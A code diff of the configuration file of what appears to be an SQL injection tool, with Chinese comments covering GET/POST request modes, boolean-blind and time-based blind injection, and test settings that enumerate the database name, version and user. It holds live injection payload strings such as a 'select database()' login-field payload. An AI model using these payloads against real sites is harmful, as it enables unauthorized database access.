@@ -6,6 +6,16 @@ from lib.log import logger
 __author__ = "LoRexxar"
 
 
+'''
+若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4
+        需要注意的是，这里输入为r.text.encode('utf-8'), return必须为查询返回值，不能多标签符号等
+        def UnpackFunction(self, r):
+            index = r.find('<td>')
+            index2 = r[index + 4:].find('</td>')
+            return r[index + 4:][:index2]
+'''
+
+
 def UnpackFunction(r):
     # index = r.find('<td>')
     # index2 = r[index + 4:].find('</td>')
@@ -36,17 +46,20 @@ class BaseConfig:
             "GET",
             "POST"
         )
-        self.sqlirequest = SqliRequest[1]
-
-        # 当传参方式为GET
-        # payload传入为键值对方式
-        # example: username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In
+        self.sqlirequest = SqliRequest[0]
+        '''
+        当传参方式为GET
+        payload传入为键值对方式
+        example: username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In
+        '''
         self.payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
 
-        # 当传参方式为POST
-        # payload传入方式为字典
-        # example: payload = {"username": "ddog' or select database()%23", "password": "a"}
-        # self.payload = {"username": "ddog' or select database()%23", "password": "a"}
+        '''
+        当传参方式为POST
+        payload传入方式为字典
+        example: payload = {"username": "ddog' or select database()%23", "password": "a"}
+        self.payload = {"username": "ddog' or select database()%23", "password": "a"}
+        '''
 
         # 注入方式 0为正常 1为盲注 2为时间盲注
         SqliMethod = (
@@ -54,20 +67,34 @@ class BaseConfig:
             "build",
             "time"
         )
-        self.sqlimethod = SqliMethod[2]
+        self.sqlimethod = SqliMethod[1]
 
-        # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4
-        # 需要注意的是，这里输入为r.text.encode('utf-8'), return必须为查询返回值，不能多标签符号等
-        # def UnpackFunction(self, r):
-        #     index = r.find('<td>')
-        #     index2 = r[index + 4:].find('</td>')
-        #     return r[index + 4:][:index2]
+        # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面
 
-        # 若注入方式为build盲注，则通过返回长度判断
-        # 永真条件的长度（盲注时需要使用）test类中test可跑，默认为0，可设置
+        '''
+        若注入方式为build盲注，则通过返回长度判断
+        永真条件的长度（盲注时需要使用）test类中test可跑，默认为0，可设置
+        '''
         self.len = 0
 
-        # 若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
-        # 建议2-5，现在版本还是单线程，所以时间盲注会非常慢非常慢...
+        '''
+        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿
+        建议2-5，现在版本还是单线程，所以时间盲注会非常慢非常慢...
+        '''
         self.time = 2
 
+        '''
+        在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user
+
+        self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启
+
+        而testmethod则是选择使用那种测试，互相兼容可以同时跑
+        '''
+        self.wtest = True
+
+        self.testmethod = {
+            "test": 0,
+            "database": 1,
+            "version": 1,
+            "user": 1
+        }
